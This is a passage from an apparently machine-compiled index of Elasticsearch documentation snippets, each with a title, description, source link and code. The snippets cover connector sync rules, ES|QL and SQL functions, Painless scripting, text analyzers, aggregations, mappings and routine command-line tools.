]\n\n                    },\n                    \"deployment_template\": {\n                        \"id\": \"gcp-storage-optimized-v3\"\n                    }\n                }\n            }\n        ]\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rules for Confluence Connector\nDESCRIPTION: Defines advanced synchronization rules for filtering Confluence data based on custom queries. Each query is specified in JSON, filtering data by criteria such as space keys and date ranges. This allows complex data synchronization scenarios tailored to specific content.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-confluence.md#2025-04-21_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"query\": \"space = DEV\"\n  }\n]\n```\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"query\": \"created >= now('-5w')\"\n  },\n  {\n    \"query\": \"lastmodified < startOfYear()\"\n  }\n]\n```\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"query\": \"type in ('page', 'attachment') AND space.key = 'SD'\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Response from Katakana Uppercase Token Filter Analysis\nDESCRIPTION: This snippet shows the response from the Elasticsearch analyze API when using the katakana_uppercase filter. It demonstrates how small katakana characters in 'ストップウォッチ' (stopwatch) are normalized to standard characters, resulting in 'ストツプウオツチ'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-katakana-uppercase.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"tokens\": [\n    {\n      \"token\": \"ストツプウオツチ\",\n      \"start_offset\": 0,\n      \"end_offset\": 8,\n      \"type\": \"word\",\n      \"position\": 0\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a void Function in Painless\nDESCRIPTION: Shows how to use the void type to define a function that doesn't return a value, in this case, a function that adds an element to a list.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-types.md#2025-04-22_snippet_8\n\nLANGUAGE: painless\nCODE:\n```\nvoid addToList(List l, def d) {\n    l.add(d);\n}\n```\n\n----------------------------------------\n\nTITLE: Counting Array Elements with MV_COUNT in ESQL\nDESCRIPTION: Example showing how to use MV_COUNT function to count the number of elements in an array field. The query creates a row with an array field 'a' containing three strings and uses MV_COUNT to count its elements.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_count.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[\"foo\", \"zoo\", \"bar\"]\n| EVAL count_a = MV_COUNT(a)\n```\n\n----------------------------------------\n\nTITLE: Generating CA Certificate with elasticsearch-certutil\nDESCRIPTION: This command generates a CA certificate and private key in PKCS#12 format. It prompts for an output filename and password, which can also be specified using the --out and --pass parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/certutil.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nbin/elasticsearch-certutil ca\n```\n\n----------------------------------------\n\nTITLE: Discovery Configuration Settings in Elasticsearch\nDESCRIPTION: Core settings that control the discovery process timing and behavior including peer finding, DNS resolution and cluster formation warnings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/discovery-cluster-formation-settings.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\ndiscovery.cluster_formation_warning_timeout: 10s\ndiscovery.find_peers_interval: 1s\ndiscovery.probe.connect_timeout: 30s\ndiscovery.probe.handshake_timeout: 30s\ndiscovery.request_peers_timeout: 3s\ndiscovery.find_peers_warning_timeout: 3m\ndiscovery.seed_resolver.max_concurrent_resolvers: 10\ndiscovery.seed_resolver.timeout: 5s\n```\n\n----------------------------------------\n\nTITLE: Example of EXPM1 Function Usage\nDESCRIPTION: Shows the relationship between E(), EXP(), and EXPM1() functions, demonstrating that EXPM1(2) equals EXP(2) - 1.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_11\n\nLANGUAGE: sql\nCODE:\n```\nSELECT E(), EXP(2), EXPM1(2);\n\n       E()       |     EXP(2)     |    EXPM1(2)\n-----------------+----------------+----------------\n2.718281828459045|7.38905609893065|6.38905609893065\n```\n\n----------------------------------------\n\nTITLE: Silent Mode Execution - Shell\nDESCRIPTION: Example command showing how to run elasticsearch-certgen in silent mode using a YAML configuration file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/certgen.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-certgen -in instances.yml\n```\n\n----------------------------------------\n\nTITLE: Running Functional Tests on Oracle Connectors\nDESCRIPTION: These shell commands are used to run functional tests for the Oracle connector within the Elastic framework. The prerequisite is the Elastic connector framework and a medium-sized dataset by default. To potentially speed up the test, you can specify a smaller dataset with the DATA_SIZE parameter. The command outputs the result of the functional test.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-oracle.md#2025-04-21_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=oracle\n```\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=oracle DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Monthly Salary Averages in ESQL\nDESCRIPTION: Calculates average salaries by hire month for the year 1985 using monthly buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/bucket.md#2025-04-21_snippet_7\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE hire_date >= \"1985-01-01T00:00:00Z\" AND hire_date < \"1986-01-01T00:00:00Z\"\n| STATS AVG(salary) BY bucket = BUCKET(hire_date, 20, \"1985-01-01T00:00:00Z\", \"1986-01-01T00:00:00Z\")\n```\n\n----------------------------------------\n\nTITLE: Configuring Sort Processor in Elasticsearch Ingest Pipeline (JSON)\nDESCRIPTION: This snippet demonstrates how to configure the Sort processor in an Elasticsearch ingest pipeline. It shows the basic structure for sorting an array field in descending order.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/sort-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"sort\": {\n    \"field\": \"array_field_to_sort\",\n    \"order\": \"desc\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Geometry Function Parameters Documentation\nDESCRIPTION: Documents two parameters (geomA and geomB) that accept geometric data types and must share the same coordinate system. Both parameters support geo_point, cartesian_point, geo_shape, and cartesian_shape types, with null handling specified.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/st_intersects.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`geomA`\n:   Expression of type `geo_point`, `cartesian_point`, `geo_shape` or `cartesian_shape`. If `null`, the function returns `null`.\n\n`geomB`\n:   Expression of type `geo_point`, `cartesian_point`, `geo_shape` or `cartesian_shape`. If `null`, the function returns `null`. The second parameter must also have the same coordinate system as the first. This means it is not possible to combine `geo_*` and `cartesian_*` parameters.\n```\n\n----------------------------------------\n\nTITLE: Defining CharacterIterator Interface in Java\nDESCRIPTION: Interface definition for CharacterIterator class that provides basic character iteration functionality. Includes methods for traversing text and managing iteration position.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.text.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass java.text.CharacterIterator {\n  char DONE\n  def clone()\n  char current()\n  char first()\n  int getBeginIndex()\n  int getEndIndex()\n  int getIndex()\n  char last()\n  char next()\n  char previous()\n  char setIndex(int)\n}\n```\n\n----------------------------------------\n\nTITLE: Static Import for Emit Callback in Boolean Field Scripts\nDESCRIPTION: The static import section specifies an `emit` callback essential for collecting values for fields in Elasticsearch scripts. This method is bound to the 'Emit' method in the 'BooleanFieldScript'. It contributes to the dynamic nature of Elasticsearch scripting by allowing the script to return values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.boolean_field.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nstatic_import {\n    # The `emit` callback to collect values for the field\n    void emit(org.elasticsearch.script.BooleanFieldScript, boolean) bound_to org.elasticsearch.script.BooleanFieldScript$Emit\n}\n```\n\n----------------------------------------\n\nTITLE: Docker Command to Run Network Drive Connector\nDESCRIPTION: This snippet provides the command to run the Docker image for the Elastic network drive connector service. The command mounts the configuration directory to the Docker container and specifies the configuration file to be used.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-network-drive.md#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ndocker run \\ \n-v ~/connectors-config:/config \\ \n--network \"elastic\" \\ \n--tty \\ \n--rm \\ \ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\ \n/app/bin/elastic-ingest \\ \n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Creating Service Token Example\nDESCRIPTION: Example command for creating a service token named 'my-token' for the elastic/fleet-server service account.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/service-tokens-command.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-service-tokens create elastic/fleet-server my-token\n```\n\n----------------------------------------\n\nTITLE: Executing Span Or Query in Elasticsearch\nDESCRIPTION: This code snippet demonstrates how to execute a span_or query in Elasticsearch. It utilizes the _search endpoint to match a union of specified span clauses. Each clause is defined as a span term query that checks for specific field values. The input is a request in JSON format to the Elasticsearch API, and the output is expected to return search results that match any of the specified terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-span-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"span_or\" : {\n      \"clauses\" : [\n        { \"span_term\" : { \"field\" : \"value1\" } },\n        { \"span_term\" : { \"field\" : \"value2\" } },\n        { \"span_term\" : { \"field\" : \"value3\" } }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Inline Synonyms in Elasticsearch JSON\nDESCRIPTION: Sets up inline synonyms directly within the Elasticsearch configuration. This is useful for small sets of synonyms that don't require external files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-graph-tokenfilter.md#2025-04-21_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"filter\": {\n    \"synonyms_filter\": {\n      \"type\": \"synonym_graph\",\n      \"synonyms\": [\"pc => personal computer\", \"computer, pc, laptop\"]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Moving Percentiles Aggregation in Elasticsearch\nDESCRIPTION: Shows the basic structure of a moving_percentiles aggregation, specifying the buckets_path and window size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-moving-percentiles-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"moving_percentiles\": {\n    \"buckets_path\": \"the_percentile\",\n    \"window\": 10\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Payload Storage\nDESCRIPTION: Creates an index that stores term vectors with payloads and uses a custom analyzer with the delimited_payload filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-delimited-payload-tokenfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT text_payloads\n{\n  \"mappings\": {\n    \"properties\": {\n      \"text\": {\n        \"type\": \"text\",\n        \"term_vector\": \"with_positions_payloads\",\n        \"analyzer\": \"payload_delimiter\"\n      }\n    }\n  },\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"payload_delimiter\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"delimited_payload\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using CURRENT_TIMESTAMP with Precision Parameter in Elasticsearch SQL\nDESCRIPTION: Example showing how to use CURRENT_TIMESTAMP with a precision parameter to round fractional seconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_19\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CURRENT_TIMESTAMP(1) AS result;\n\n         result\n------------------------\n2018-12-12T14:48:52.4Z\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Conditional Token Filter in Elasticsearch\nDESCRIPTION: This example creates a custom analyzer that uses a conditional filter to reverse only the first token in a text. The custom filter matches tokens at position 0 and applies the reverse filter to them.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-condition-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /palindrome_list\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"whitespace_reverse_first_token\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"reverse_first_token\" ]\n        }\n      },\n      \"filter\": {\n        \"reverse_first_token\": {\n          \"type\": \"condition\",\n          \"filter\": [ \"reverse\" ],\n          \"script\": {\n            \"source\": \"token.getPosition() === 0\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Pattern Tokenizer in Elasticsearch\nDESCRIPTION: Example showing how to use the default pattern tokenizer to analyze text, which splits on non-word characters (\\W+). The example demonstrates tokenizing a sentence containing underscores and apostrophes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": \"pattern\",\n  \"text\": \"The foo_bar_size's default is 5.\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ The, foo_bar_size, s, default, is, 5 ]\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with HTML Strip Filter in Elasticsearch\nDESCRIPTION: This example shows how to create a custom analyzer that incorporates the HTML strip filter using the create index API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-htmlstrip-charfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"keyword\",\n          \"char_filter\": [\n            \"html_strip\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Map Access Operator Usage in Painless\nDESCRIPTION: This snippet demonstrates the use of the map access operator '[]' in Painless as a shortcut for 'put' and 'get' method calls on Map type values. It highlights error handling when non-Map values are accessed. Prerequisites include initializing a Map instance. It shows how values can be retrieved and updated using the '[]' operator with both Map and def types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_15\n\nLANGUAGE: painless\nCODE:\n```\nMap map = new HashMap();\nmap['value2'] = 2;\nmap['value5'] = 5;\nint x = map['value2'] + map['value5'];\nString y = 'value5';\nint z = x[z];\n```\n\n----------------------------------------\n\nTITLE: Painless Script for Action-Specific Formatting\nDESCRIPTION: This Painless script is used within a Watcher action to format monetary values as currency and concatenate them into a comma-separated string. It utilizes the `NumberFormat` class to achieve currency formatting and the `Collectors.joining` method to construct the final message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-watcher-transform-context.md#2025-04-21_snippet_3\n\nLANGUAGE: painless\nCODE:\n```\n\n          def formatter = NumberFormat.getCurrencyInstance();\n          return [\n            'msg': ctx.payload.aggregations.theatres.buckets.stream()\n              .map(t-> formatter.format(t.money.value) + ' for the play ' + t.key)\n              .collect(Collectors.joining(\", \"))\n          ]\n          \n```\n\n----------------------------------------\n\nTITLE: Defining Index Mapping for Science Fiction Books\nDESCRIPTION: This snippet shows how to create an index mapping for science fiction books, including fields for name, author, release date, and page count.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"name\": {\n        \"type\": \"keyword\"\n      },\n      \"author\": {\n        \"type\": \"keyword\"\n      },\n      \"release_date\": {\n        \"type\": \"date\"\n      },\n      \"page_count\": {\n        \"type\": \"double\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Hockey Document in Elasticsearch\nDESCRIPTION: Creates a document in the hockey index with player statistics including goals, assists, and games played.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-debugging.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /hockey/_doc/1?refresh\n{\"first\":\"johnny\",\"last\":\"gaudreau\",\"goals\":[9,27,1],\"assists\":[17,46,0],\"gp\":[26,82,1]}\n```\n\n----------------------------------------\n\nTITLE: Executing a Parent Aggregation Query\nDESCRIPTION: Performs a search with nested aggregations that first groups by answer owner names, then uses the parent aggregation to connect to the parent question documents, and finally aggregates by question tags.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-parent-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST parent_example/_search?size=0\n{\n  \"aggs\": {\n    \"top-names\": {\n      \"terms\": {\n        \"field\": \"owner.display_name.keyword\",\n        \"size\": 10\n      },\n      \"aggs\": {\n        \"to-questions\": {\n          \"parent\": {\n            \"type\" : \"answer\" <1>\n          },\n          \"aggs\": {\n            \"top-tags\": {\n              \"terms\": {\n                \"field\": \"tags.keyword\",\n                \"size\": 10\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sum Aggregation with Missing Value Handling in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to handle missing values in sum aggregation. It treats documents without a price as having a default value of 100.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-sum-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"query\": {\n    \"constant_score\": {\n      \"filter\": {\n        \"match\": { \"type\": \"hat\" }\n      }\n    }\n  },\n  \"aggs\": {\n    \"hat_prices\": {\n      \"sum\": {\n        \"field\": \"price\",\n        \"missing\": 100\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Value Difference with Painless Runtime Long Field Context\nDESCRIPTION: This script uses the long_field context to calculate the difference between end and start values from a measures object, demonstrating numeric operations in runtime fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_19\n\nLANGUAGE: console\nCODE:\n```\nPOST /_scripts/painless/_execute\n{\n  \"script\": {\n    \"source\": \"\"\"\n      emit(doc['measures.end'].value - doc['measures.start'].value);\n    \"\"\"\n  },\n  \"context\": \"long_field\",\n  \"context_setup\": {\n    \"index\": \"my-index-000001\",\n    \"document\": {\n      \"measures\": {\n        \"voltage\": \"4.0\",\n        \"start\": \"400\",\n        \"end\": \"8625309\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Documents with Custom Analyzer for Version 5 in JSON\nDESCRIPTION: Inserts a document into the Elasticsearch index using the custom analyzer for version 5, with only the content field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_9\n\nLANGUAGE: json\nCODE:\n```\nPOST /index/my_type\n{\n  \"content\": \"Doc 1\"\n}\n```\n\n----------------------------------------\n\nTITLE: Logging Exceptions in Elasticsearch (Java)\nDESCRIPTION: Shows how to log exceptions with their stack traces in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_11\n\nLANGUAGE: java\nCODE:\n```\nlogger.debug(\"operation failed\", exception);\n```\n\n----------------------------------------\n\nTITLE: Equality Equals with Boolean Type in Painless\nDESCRIPTION: Demonstrates the usage of the equality equals operator with boolean values in Painless.  It declares two boolean variables, assigns them values, and then uses the '==' operator to compare them, updating the variables with the results of the comparison.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_11\n\nLANGUAGE: painless\nCODE:\n```\n\"boolean a = true;  <1>\nboolean b = false; <2>\na = a == false;    <3>\nb = a == b;        <4>\"\n```\n\n----------------------------------------\n\nTITLE: Indexing WKT Geometry Collection in Elasticsearch\nDESCRIPTION: Example of indexing a WKT Geometry Collection in Elasticsearch. The collection combines a point and a linestring in a single WKT string format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_17\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"GEOMETRYCOLLECTION (POINT (1000.0 100.0), LINESTRING (1001.0 100.0, 1002.0 100.0))\"\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Hyperbolic Sine using ESQL\nDESCRIPTION: This snippet demonstrates how to calculate the hyperbolic sine of a given number using ESQL. The function SINH takes a numeric value and returns its hyperbolic sine. In this case, the value of 'a' is initialized to 1.8 and its hyperbolic sine is computed and stored in the variable 'sinh'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/sinh.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL sinh=SINH(a)\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Search Response with Ignored Field Values\nDESCRIPTION: Sample response showing how ignored field values appear separately in the search results under the ignored_field_values path, while successfully indexed fields appear in the fields section.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\n{\n  \"took\" : 2,\n  \"timed_out\" : false,\n  \"_shards\" : {\n    \"total\" : 1,\n    \"successful\" : 1,\n    \"skipped\" : 0,\n    \"failed\" : 0\n  },\n  \"hits\" : {\n    \"total\" : {\n      \"value\" : 1,\n      \"relation\" : \"eq\"\n    },\n    \"max_score\" : 1.0,\n    \"hits\" : [\n      {\n        \"_index\" : \"my-index-000001\",\n        \"_id\" : \"1\",\n        \"_score\" : 1.0,\n        \"_ignored\" : [ \"my-small\"],\n        \"fields\" : {\n          \"my-large\": [\n            \"ok content\"\n          ],\n          \"my-small\": [\n            \"ok\"\n          ]\n        },\n        \"ignored_field_values\" : {\n          \"my-small\": [\n            \"bad\"\n          ]\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Execution Hint for Significant Terms in Elasticsearch\nDESCRIPTION: This example shows how to set an execution hint for the significant terms aggregation. It uses the 'map' execution mode, which is suitable when very few documents match the query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"tags\": {\n      \"significant_terms\": {\n        \"field\": \"tags\",\n        \"execution_hint\": \"map\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Classic Tokenizer in Elasticsearch\nDESCRIPTION: Example of using the classic tokenizer to analyze an English text string. Shows how the tokenizer handles numbers, hyphens, and punctuation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-classic-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": \"classic\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ The, 2, QUICK, Brown, Foxes, jumped, over, the, lazy, dog's, bone ]\n```\n\n----------------------------------------\n\nTITLE: Converting Radians to Degrees in SQL\nDESCRIPTION: The DEGREES function converts a numeric expression from radians to degrees. It accepts one numeric input and outputs a double numeric value. Returning null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_45\n\nLANGUAGE: sql\nCODE:\n```\nDEGREES(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Basic Serial Differencing Aggregation in Elasticsearch\nDESCRIPTION: Basic example of a serial differencing aggregation that specifies the bucket path and lag period. The lag parameter determines how many buckets back to compare the current value against.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-serialdiff-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"serial_diff\": {\n    \"buckets_path\": \"the_sum\",\n    \"lag\": 7\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Text Categorization Query\nDESCRIPTION: Simple example of using categorize_text aggregation to group similar text messages into categories.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-categorize-text-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST log-messages/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"categories\": {\n      \"categorize_text\": {\n        \"field\": \"message\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic MATCH Function on Author Field in ESQL\nDESCRIPTION: Demonstrates using the MATCH function to find books where the author field contains 'Faulkner'. Shows how MATCH searches through text fields and returns matching records.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/match.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE MATCH(author, \"Faulkner\")\n```\n\n----------------------------------------\n\nTITLE: Using TOP Function for Salary Analysis in ESQL\nDESCRIPTION: Example query showing how to retrieve the top 3 salaries in descending order along with the maximum salary from an employees table. The TOP function returns an array of values while MAX returns a single value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/top.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS top_salaries = TOP(salary, 3, \"desc\"), top_salary = MAX(salary)\n```\n\n----------------------------------------\n\nTITLE: HDR Histogram Implementation for Percentile Ranks in Elasticsearch\nDESCRIPTION: Shows how to use HDR Histogram implementation for percentile ranks calculation, which offers better performance for latency measurements with configurable precision.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-percentile-rank-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"load_time_ranks\": {\n      \"percentile_ranks\": {\n        \"field\": \"load_time\",\n        \"values\": [ 500, 600 ],\n        \"hdr\": {\n          \"number_of_significant_value_digits\": 3\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Doc-Value-Only Fields in Elasticsearch\nDESCRIPTION: Example showing how to configure fields with doc values only, where one field is regular and another has indexing disabled. Demonstrates the tradeoff between disk usage and query performance for rarely queried fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/doc-values.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"status_code\": {\n        \"type\":  \"long\"\n      },\n      \"session_id\": {\n        \"type\":  \"long\",\n        \"index\": false\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Translating SQL Group By with Constant Scalar to Elasticsearch JSON\nDESCRIPTION: This snippet shows how a SQL GROUP BY clause with a constant scalar expression is translated into an Elasticsearch aggregation query. It uses a script to calculate PI() * int for grouping and ordering.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT PI() * int\nFROM test\nWHERE PI() * int > 5.0\nGROUP BY PI() * int\nORDER BY PI() * int LIMIT 10;\n```\n\nLANGUAGE: json\nCODE:\n```\n{\"script\":{\"source\":\"InternalSqlScriptUtils.mul(InternalQlScriptUtils.docValue(doc,params.v0),params.v1)\",\n\"params\":{\"v0\":\"int\",\"v1\":3.141592653589793}},\n\"missing_bucket\":true,\"value_type\":\"double\",\"order\":\"asc\"}}]}}}}\n```\n\n----------------------------------------\n\nTITLE: SQL Example of STDDEV_SAMP Function with Calculated Field\nDESCRIPTION: This example demonstrates using STDDEV_SAMP on a calculated field (salary / 12.0). It calculates the minimum, maximum, and sample standard deviation of the monthly salary from the 'emp' table. The result presents these values, showcasing the use of STDDEV_SAMP with arithmetic expressions.\nSOURCE: 